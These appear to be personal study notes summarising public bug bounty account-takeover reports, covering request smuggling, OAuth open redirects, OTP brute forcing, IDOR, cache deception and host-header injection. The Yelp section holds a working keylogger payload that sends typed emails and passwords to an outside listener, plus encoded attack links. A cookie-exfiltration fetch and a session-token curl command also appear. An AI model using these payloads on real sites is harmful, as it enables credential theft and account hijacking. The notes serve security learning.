# 1 ( Account Takeover via Disclosed Session Cookie )
---
# 2 ( Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies)
- he used a tool called ==smuggle==  to do automated  ( HTTP request smuggling ) using only the link of the target 

```smuggle.py
### Scan one Url

[*](https://github.com/anshumanpattnaik/http-request-smuggling#scan-one-url)


python3 smuggle.py -u <URL>


### Scan list of Urls

[*](https://github.com/anshumanpattnaik/http-request-smuggling#scan-list-of-urls)


python3 smuggle.py -urls <URLs.txt>
```

![[Pasted image 20240627220631.png|1475]]

attacked the same target : https://slackb.com
using tool : smuggle.py
after he detected the working payload he just tested it for him it was ==space1==  so he retested  manual 
![[Pasted image 20240627221053.png]]

---
# 3. (Bypassing Digits origin validation which leads to account takeover)

- infected validation JS code : 
 ```javascript
 e.exports = { 2 sdk_host: "https://www.digits.com", 3[..] 4onReceiveMessage: function(t) { 5 this.config && -1 !== this.config.get("sdk_host").search(t.origin) && this.resolve(t.data) 6},
```
- the validation of digit that are passed happens through the origin and the origin got checked via regex instead of a string . 
- in regexp  a dot (.) is treated as a wild card . 
- so attacker use a special domain instead of the official  
- instead of ( www.digits.com) he use ( www.d.gits.co) 
- An example of comparing such a special domain looks like this:

		`www.d.gits.co` 
		`www.digits.com`

	 Notice that `www.d.gits.co` is now a subset of `www.digits.com`, thus it effective bypasses the validation.
	 this because the dot got treated in regexp as if it is all and any character so the filter got bypassed as it is i but it is actually the attackers domain .
	 this happened due to the the using of  [string.prototype.search()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/search) in JS validation code. 
- In strict validation, domains with different TLDs (`www.digits.com` vs `www.d.gits.co`) should not be considered the same.
- However, if validation incorrectly uses regular expressions that interpret dots as wildcards, it may mistakenly allow `www.d.gits.co` to pass as if it were `www.digits.com`, thus bypassing intended checks.
 
 ---
# 5 . account takeOver due  _Amazon Cognito_ misconfiguration 
- [detailed exploitation ](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/)

---

# 6.   Improper Restriction of Authentication Attempts  leaded to account takeOver

- no rate limit for the OTP so 
- if attacker went to /reset-password 
- email: admin@web-site.com 
- then at the otp section if its for example 4 digits  he brute force it 
- he got the  recovery-token 
- ![[Pasted image 20240628000125.png]]
- now use it to change admin@web-site.com password
---

# 10.  chaining csrf with open redirect to account takeOver on tiktok website

- details about it [here](https://security.lauritz-holtmann.de/advisories/tiktok-account-takeover/#authentication-response-target)
---
# 11. open redirect to account takeOver 

- he found an open redirect on `https://cs.money` domain, using this payload `https://cs.money///google.com`

```report 

`ttps://cs.money` domain, using this payload `https://cs.money///google.com` we can redirect into any domain that we want, you can see the request and response from this image below :

███

## Steps To Reproduce:

The final payload is having an account takeover as the impact, by chaining the openredirect vulnerability with login oauth function, the steps to reproduce is below:

1. Open this url `https://auth.dota.trade/login?redirectUrl=https://cs.money///loving-turing-29a494.netlify.app%2523&callbackUrl=https://cs.money///loving-turing-29a494.netlify.app%2523` , the login url was gotten from `cs.money` index page button `sign in through steam`:

█████████

2. Login as usual, the application will redirect you to `https://loving-turing-29a494.netlify.app/#?token=Dlk9sGd8zc6OvxlITijQR&redirectUrl=https://cs.money///loving-turing-29a494.netlify.app#` you will see like this image : ███████ 3.the attacker already received the victim token on the attacker listener ███

**If the vulnerability requires hosted server, please, let us know if it is a public or a local one you've tested vulnerability on.** ### Public My POC Hosted here : loving-turing-29a494.netlify.app

I also create the video POC that show an attacker take over an victim account : █████

## Impact

Attacker gained full control of the victim account, was able to change the trade-offer link into the attacker link and redeem all the items into attacker account and almost can do anything.
```

---
# 12. change any user's password through an endpoint (uber)
- the endpoint :    ` /rt/users/passwordless-signup `
- via phone number of the target only
- given knowledge of their phone number (or by just enumerating phone numbers until one is found that is registered with Uber - not too hard given the number of Uber users).
REQUEST:
```HTTP
POST /rt/users/passwordless-signup HTTP/1.1
Host: cn-geo1.uber.com
User-Agent: client/iphone/2.137.1
Connection: close
Content-Type: application/json
Content-Length: 197

{"phoneNumberE164":"+xxxxxxxx","userWorkflow":"PASSWORDLESS_SIGNUP","userRole":"client","mobileCountryISO2":"XX","state":"CREATE_NEW_PASSWORD","newPasswordData":{"newPassword":"12345678911a!"}}

```
RESPONSE:
```HTTP
{"phoneNumberE164":"+xxxxxxxx","serverState":"SUCCEEDED","serverStateData":{"nextState":"SIGN_IN"},"tripVerifyStateData":{},"userMessage":"New password has been created. Please login with the new Password.","userRole":"client","userWorkflow":"PASSWORDLESS_SIGNUP"}
```

--- 

# 13 . from XSS to ATO (account takeover) via (login key-logger , link attacker's google account with targets website_account ) ==288,000==

- the target was : yelp.com
- in some cases a cookie called `guvo = `  gets reflected without sensitization 
-  the attacker target was to modify that `guvo = ` value to implement JS on it .
- he found  that parameter called `?canary=[cookie passed value]` to the cookie called `yelpmainpaastacanary = ` .
- smuggling  `guvo = JS` into   `yelpmainpaastacanary = here`  via the `?canary= `
- in the correct secured scenario 
	- if we put  `?canary = 1%20%b=2`  then `yelpmainpaasacanary = a=1; b=2;` 
- but
	- it got put as one two cookies put treated as one cookie because it got put as `yelpmainpaastacanary = a=1 b=1 ;` so all the `a=1 b=2` will pass as the values of the  `cookie : a=1 b=2 ;`
- by making a request to : 
	`https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E`
- which sets cookie : 
	`Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Domain=.yelp.com; Path=/; Secure; `
 - As an added bonus we can also inject a `Max-Age: 99999999` attribute so our cookie doesn't expire and will just live in the victims browser and wait for our XSS injection to happen:
	 `https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999`

	`Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Max-Age=99999999; Domain=.yelp.com; Path=/; Secure; SameSite=Lax`

- in the JS payload he used : ==key-logger==  to fetch both password and email  send them to his `calc.sh` (listener)
 ```JS
 setTimeout(function () {
  a = document.getElementsByName('password')[0];
  b = document.getElementsByName('email')[0];
  function f() {
    fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
  }
  a.form.onclick=f;
  a.onchange=f;
  b.onchange=f;
  a.oninput=f;
  b.oninput=f;
}, 1000)
```
and the link : 
`https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dCgoZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7ZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8%2FYT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKX1hPWRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJwYXNzd29yZCIpWzBdLGI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoImVtYWlsIilbMF0sYS5mb3JtLm9uY2xpY2s9ZSxhLm9uY2hhbmdlPWUsYi5vbmNoYW5nZT1lLGEub25pbnB1dD1lLGIub25pbnB1dD1lfSksMWUzKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999`

- ATO by linking a google account of the attacker : 
	- the account got linked to  the google account normally 
	- via  the attackers special `id_token` when he is trying to attach his own google account to his own web_account .
	- intruding the last request  when attacker  got the  `id_token ` forcing victim to send  that `id_token` from victim's account   leading to him attaching his own account with the  attacker's account  by just viewing the malicious link  sent by attacker which contains that JS code :  
```JS
(function f() {
  a = new XMLHttpRequest();
  a.addEventListener('load', function () {
    rx = /"GoogleConnect": "([^"]*)/;
    id_token = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjYwODNkZDU5ODE2NzNmNjYxZmRlOWRhZTY0NmI2ZjAzODBhMDE0NWMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYmYiOjE2ODU3MTAxNjEsImF1ZCI6IjY5OTY5MTg5NTcxMS12bTJrOGVnYjMyN2hxM2wwYTdjcnNqMG8ybzlsZW42MS5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjEwNDA0MTA1MzkyMjQ5NDY3MjExNyIsImVtYWlsIjoiZG9vZGFkdWd1Y0BnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXpwIjoiNjk5NjkxODk1NzExLXZtMms4ZWdiMzI3aHEzbDBhN2Nyc2owbzJvOWxlbjYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwibmFtZSI6IkRhZGUgTXVycGh5IiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FBY0hUdGZGVlRFSU5fc3VVV01CTmpjSGFEWHg3TDJlbHFQMTVwNGhLaksxPXM5Ni1jIiwiZ2l2ZW5fbmFtZSI6IkRhZGUiLCJmYW1pbHlfbmFtZSI6Ik11cnBoeSIsImlhdCI6MTY4NTcxMDQ2MSwiZXhwIjoxNjg1NzE0MDYxLCJqdGkiOiJmNzYyZDZlZjEyZmFkNjI5YmE4YTY5OGFhMDNhMGM3NzU4MzYwYWUxIn0.K-XcaABVhUv-WmcpHLCEaDk5reYWH07Ab1QkUxhaGbNQYzt14ViPm2ybiIgJUKhyuwJzzAjllJvtrV2_NrUZnQ0vA_v7PuKO9GQVh72nYx5sWn6LjMsuWLh5d24Vk-Ry1CqC_xs2jEeh03emsZ-1Gha_-ABwlbCDH5yqeepNkh2EaYZ7cKVsUUxnIjpXKrO7xS7zP7aByt0mHA1gUSei-4aal_PVK4zIGa2GyvLCTQ3fqseDz7FCrQYO-3H-VK9O2NiBYZczbz_vLoRQtASeRgbj5jQUtEDjfzK8MTVgvWPVj3EZvt4Bbd0cp_oFmpL1WjMyB9mTtOKBSM3DaWdLNg";
    b = rx.exec(this.responseText);
    fetch("https://www.yelp.dk/google_connect/register", {"method": "POST", "body": new URLSearchParams({"id_token": id_token, "csrftok": b[1]})})
  });
  a.open('GET', 'https://www.yelp.dk/profile_sharing');
  a.send();
})();
```
final link : 

`https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27YT1uZXcgWE1MSHR0cFJlcXVlc3QsYS5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwoZnVuY3Rpb24oKXtyeD0vIkdvb2dsZUNvbm5lY3QiOiAiKFteIl0qKS8saWRfdG9rZW49ImV5SmhiR2NpT2lKU1V6STFOaUlzSW10cFpDSTZJall3T0ROa1pEVTVPREUyTnpObU5qWXhabVJsT1dSaFpUWTBObUkyWmpBek9EQmhNREUwTldNaUxDSjBlWEFpT2lKS1YxUWlmUS5leUpwYzNNaU9pSm9kSFJ3Y3pvdkwyRmpZMjkxYm5SekxtZHZiMmRzWlM1amIyMGlMQ0p1WW1ZaU9qRTJPRFUzTVRBeE5qRXNJbUYxWkNJNklqWTVPVFk1TVRnNU5UY3hNUzEyYlRKck9HVm5Zak15TjJoeE0yd3dZVGRqY25OcU1HOHliemxzWlc0Mk1TNWhjSEJ6TG1kdmIyZHNaWFZ6WlhKamIyNTBaVzUwTG1OdmJTSXNJbk4xWWlJNklqRXdOREEwTVRBMU16a3lNalE1TkRZM01qRXhOeUlzSW1WdFlXbHNJam9pWkc5dlpHRmtkV2QxWTBCbmJXRnBiQzVqYjIwaUxDSmxiV0ZwYkY5MlpYSnBabWxsWkNJNmRISjFaU3dpWVhwd0lqb2lOams1TmpreE9EazFOekV4TFhadE1tczRaV2RpTXpJM2FIRXpiREJoTjJOeWMyb3diekp2T1d4bGJqWXhMbUZ3Y0hNdVoyOXZaMnhsZFhObGNtTnZiblJsYm5RdVkyOXRJaXdpYm1GdFpTSTZJa1JoWkdVZ1RYVnljR2g1SWl3aWNHbGpkSFZ5WlNJNkltaDBkSEJ6T2k4dmJHZ3pMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlM5aEwwRkJZMGhVZEdaR1ZsUkZTVTVmYzNWVlYwMUNUbXBqU0dGRVdIZzNUREpsYkhGUU1UVndOR2hMYWtzeFBYTTVOaTFqSWl3aVoybDJaVzVmYm1GdFpTSTZJa1JoWkdVaUxDSm1ZVzFwYkhsZmJtRnRaU0k2SWsxMWNuQm9lU0lzSW1saGRDSTZNVFk0TlRjeE1EUTJNU3dpWlhod0lqb3hOamcxTnpFME1EWXhMQ0pxZEdraU9pSm1Oell5WkRabFpqRXlabUZrTmpJNVltRTRZVFk1T0dGaE1ETmhNR00zTnpVNE16WXdZV1V4SW4wLkstWGNhQUJWaFV2LVdtY3BITENFYURrNXJlWVdIMDdBYjFRa1V4aGFHYk5RWXp0MTRWaVBtMnliaUlnSlVLaHl1d0p6ekFqbGxKdnRyVjJfTnJVWm5RMHZBX3Y3UHVLTzlHUVZoNzJuWXg1c1duNkxqTXN1V0xoNWQyNFZrLVJ5MUNxQ194czJqRWVoMDNlbXNaLTFHaGFfLUFCd2xiQ0RINXlxZWVwTmtoMkVhWVo3Y0tWc1VVeG5JanBYS3JPN3hTN3pQN2FCeXQwbUhBMWdVU2VpLTRhYWxfUFZLNHpJR2EyR3l2TENUUTNmcXNlRHo3RkNyUVlPLTNILVZLOU8yTmlCWVpjemJ6X3ZMb1JRdEFTZVJnYmo1alFVdEVEamZ6SzhNVFZndldQVmozRVp2dDRCYmQwY3Bfb0ZtcEwxV2pNeUI5bVR0T0tCU00zRGFXZExOZyIsYj1yeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KSxmZXRjaCgiaHR0cHM6Ly93d3cueWVscC5kay9nb29nbGVfY29ubmVjdC9yZWdpc3RlciIse21ldGhvZDoiUE9TVCIsYm9keTpuZXcgVVJMU2VhcmNoUGFyYW1zKHtpZF90b2tlbjppZF90b2tlbixjc3JmdG9rOmJbMV19KX0pfSkpLGEub3BlbigiR0VUIiwiaHR0cHM6Ly93d3cueWVscC5kay9wcm9maWxlX3NoYXJpbmciKSxhLnNlbmQoKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999`

---

# 17.   Mass acount takeOVer via an IDOR  (552 000 )

- tooken usually used for things like auth . 
- they used token to refer for the target user instead of his id 
- which made a leaked token  from user in  the delete invitaion request feature.
- and resolved by using the invitation id  instead of the token to look up the user's invite when deleting an invitation  . validation was added to ensure the ID belongs to the user’s Organization . 

--- 
# 18. Account takeOver via IDOR 

- an alternate site than starbucks ( the target(starbucks))  shared =>  _Database_ , cookie _credintials_  with `card.starbucks.com.sg` .
- By reconing  the alternate site endpoints he found  an endpoint  made them able to copy PHPSESSID   from the `card.starbucks.com.sg`  
- then see user information, update the password and perform an account takeover
- - -
# 19.  ATO via CSRF  using linked accounts
- the attacker found a weakness in third-party account linking process  .
- he was able to  create maliciouse link 
- that would under certain conds give him access to victim’s `social club` account 
- -  - 
# 20.  Ability to ==DOS== any  organaizationj’s ==SSO== (single sign on) and open the door to ATO 
-  
```chatgpt_smarry
Let's break down the concept of keypairs in this scenario and explain each part step-by-step:

### What is a Keypair?

- **Keypair**: In cryptography, a keypair consists of a private key and a public key. These keys are used for encrypting and decrypting data. The private key is kept secret, while the public key is shared.

### What is a Keypair Doing in This Scenario?

- **SSO Authentication**: In SSO, keypairs are used to sign authentication tokens (like SAML Responses) to prove the identity of the user and the authenticity of the request.
- **Private Key**: Used to sign the authentication token.
- **Public Key**: Used by the recipient (e.g., the SSO provider) to verify the signature.

### How Did the Attacker Get the Victim's Keypair?

- **Attacker Doesn't Get Victim's Keypair**: The attacker does not actually get the victim's keypair. Instead, the attacker creates their own keypair for their fake organization.
- **Manipulation of EntityID**: By creating a new organization with a similar `entityId` (with a space at the end), the attacker exploits the system’s logic to redirect users.

### How Did the Attacker Control Their Own Keypair?

- **Creating a New Organization**: The attacker creates a new Grammarly business account (an organization) and generates a new keypair for this account.
    - **Private Key**: The attacker keeps this private and uses it to sign authentication tokens for their fake organization.
    - **Public Key**: The public key is provided to the SSO provider to verify the tokens signed by the attacker.

### Detailed Explanation of the Attack

1. **Setup Legitimate SSO**:
    
    - The legitimate organization has its own `entityId` and keypair.
    - Users authenticate using this legitimate keypair.
2. **Create Attacker’s Organization**:
    
    - The attacker creates a new Grammarly business account with a `entityId` identical to the legitimate one but with a space at the end.
    - The attacker generates a new keypair for this fake organization.
3. **Exploit the System’s Logic**:
    
    - When a user tries to log in, the system gets confused by the similar `entityIds`.
    - The system prioritizes the attacker's `entityId` (due to the space) and redirects the user to the attacker’s organization.
4. **User Authentication**:
    
    - The user thinks they are logging into the legitimate organization, but they are actually being authenticated into the attacker’s organization.
    - The attacker’s private key is used to sign the authentication token.
    - The user is provisioned into the attacker’s organization.
5. **Further Exploitation**:
    
    - Once the user is provisioned into the attacker’s organization, the attacker can change their `entityId` again to avoid detection.
    - The attacker retains control over their own keypair, ensuring continuous access to the user's account.

### Summary of Key Concepts

- **Keypair**: A set of cryptographic keys (private and public) used for signing and verifying data.
- **Private Key**: Kept secret, used to sign authentication tokens.
- **Public Key**: Shared with others, used to verify signatures.
- **EntityID**: A unique identifier for an organization in SSO.
- **Manipulation**: The attacker creates a fake organization with a similar `entityId` to exploit the system’s logic.

By understanding these concepts, you can see how the at

```
---
# 22 .  ATO 

- target : www.periscope.tv using  twitter
- change host header from    `host: www.periscope.tv` to `host: attacker.com/www.periscope.tv`
- the oauth redirect destination will be `attackerr.com/www.periscope.tv` 
-  allowing the attacker to send the Oauth autherize link to victim , taking over his account
 - - - 

# IDOR  when editing users leads to ATO 

- at button ==Edit==    you will send a GET  request to endpoint `/users/list-users.php`
- with params `id=(user_id)&popup=1` 
- the param   `id=...` is vuln to idor   when it is changed  you see victim’s email inresponse 
-  ![[Pasted image 20240702040349.png]]

- and with the victim’s email  like in photo there is button called update permissions  if clicked   things got saved and you got redirected to the victims  account without signing in . 
- - -
#  25. bruteforcing  the SMS auth code  to get ATO

-  at Mail.ru    the attacker found  a registration code sent ot authenticate only one time 
- so he bruteforced it and then he could sing up any account via any arbitary phone number and  use that account  as if its his own account 
- - - 
# 28. Insufficient protection allowed account takeover at am.ru via account recovery code bruteforcing

- - - 
#  29.   Endpoints leaded to ATO 

- Endpoints  `/heapdump   /env`  .
- `/heapdump` leaks data from the java virtual machine leading  to disclosure ofadmin creds , user tokens  ,other_data
- the non detection of that Endpoints  were because of the custom path of them  the team had made  at the company  so  it didnot got pentested
- - - 
# 30.  Cache Deception Allows ATO 
```
## Summary:

I'm able to extract user's session (HASESSIONV3) as it is disclosed in a cacheable page, allowing me to access the `ha.crumb` token located in `/traveler/profile/edit`

**Code** 503 Bytes[Unwrap lines](https://hackerone.com/reports/1698316) [Copy](https://hackerone.com/reports/1698316) [Download](https://hackerone.com/reports/1698316)


GET /traveler/profile/edit HTTP/2
Host: www.abritel.fr 
Cookie: HASESSIONV3=<use the token here> 
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Referer: https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/0?petIncluded=false&filterByTotalPrice=true&ssr=true 
Upgrade-Insecure-Requests: 1 
Te: trailers

## Steps To Reproduce:

Victim Steps:

1->Visit [https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis](https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis)

Attacker Steps:

1->Visit the same URL using any other browser or do

`curl 'https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis' --compressed | grep -i 'HASESSIONV3'`

2-> use the token

**Code** 503 Bytes[Unwrap lines](https://hackerone.com/reports/1698316) [Copy](https://hackerone.com/reports/1698316) [Download](https://hackerone.com/reports/1698316)

1GET /traveler/profile/edit HTTP/2 2Host: www.abritel.fr 3Cookie: HASESSIONV3=<use the token here> 4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 6Accept-Language: en-US,en;q=0.5 7Accept-Encoding: gzip, deflate 8Referer: https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/0?petIncluded=false&filterByTotalPrice=true&ssr=true 9Upgrade-Insecure-Requests: 1 10Te: trailers

and look for the `ha.crumb` variable in the response

## Recommended Remediation Steps

1. Add cache rules for certain all cacheable extensions

## Impact

Account Takeover
```

-- -
# 31.  Open redirect in `cetral.uber.com` leads to  ATO
- it was an error in the ==`OAuth2`== flow for  `central.uber.com`  
- param called `state=....` in `login.uber.com` instead of containing CSRF_token  it contained `after_login_redirection_path` 
- hacker changed the path to another account path and logged with his creds and then he got redirected to the other account  that he had no creds for . 
- - - 
# 34. ATO from misconfiguration (logical flow )
-  if Victim send a change email request from his account to a wrong  email address  ex: `attacker@gmail.com`
- and then he realized that this is not his account or he lost access to it 
- so he sent quickly another change email request to his correct email `victim@gmail.com`  and he verified  it via the sent link  .
- Now : the attacker found that the  mis sent activation email to `attacker@gmail.com` is still working and if attacker confirmed at any time the victim’s email will be changed to `attacker@gmail.com` and the victim will lose his account .
- - - 
# 35. Full account takeover without user interaction on signUP with Apple flow 
-  An email parameter was manipulated in the request flow to our servers. This scenario can only be performed on a previously unlinked apple ID account with Glassdoor. Changing the email in the request flow allowed the researcher to takeover a dummy account and performed the actions on a dummy account without the user knowing about it.
- - -
# 36.    
```
The link you provided is crafted in a way that attempts to exploit a vulnerability by injecting malicious content into the HTTP request headers. Let's break down what's happening here:

1. **URL Structure**: The URL starts with `https://www.32red.com/`, followed by `%20HTTP/1.1%0a`. `%20` represents a URL-encoded space (` `), and `%0a` represents a URL-encoded newline character (`\n`).

2. **Injected Headers**: After `%0a`, it injects the following headers:
   - `Cookie: csrfToken=INJECTION`
   - Followed by a payload that includes JavaScript code:
     ```
     '-fetch('https://REPLACE_URL_HERE',{method:'POST',body:document.cookie+"\\u003bCAKEPHP="+Red.SessionId})-'
     ```
   This payload attempts to make a POST request to `https://REPLACE_URL_HERE` with the current document's cookie and appends `CAKEPHP=` followed by `Red.SessionId` to the body of the request.

3. **Explanation**:
   - **HTTP Headers in URL**: Generally, HTTP headers are not supposed to be part of the URL itself. They are sent in a separate section of an HTTP request. However, some vulnerabilities or misconfigurations might allow such injection attempts to be processed by the server.
   
   - **Intent**: The intention of such a crafted URL is to exploit a server-side vulnerability where the server might parse the URL incorrectly and treat the injected headers as valid HTTP headers. This can lead to various types of attacks, such as session hijacking, cross-site scripting (XSS), or other forms of unauthorized data access.

4. **Possibility**: It is possible to inject headers into certain parts of an HTTP request under certain conditions, typically when there's a server-side parsing vulnerability or misconfiguration. However, modern web servers and frameworks are designed to prevent such injections through proper parsing and validation of incoming requests.

5. **Security Implications**: URLs like the one you provided are often used in penetration testing and security research to demonstrate potential vulnerabilities. For actual systems, it's crucial to ensure that servers are configured securely to avoid parsing URLs in a way that could lead to unintended security risks.

In summary, the link you mentioned attempts to inject HTTP headers into a URL, exploiting potential vulnerabilities in server-side processing of HTTP requests. Such techniques are used to demonstrate security flaws and should be addressed and fixed by system administrators and developers to prevent exploitation.
```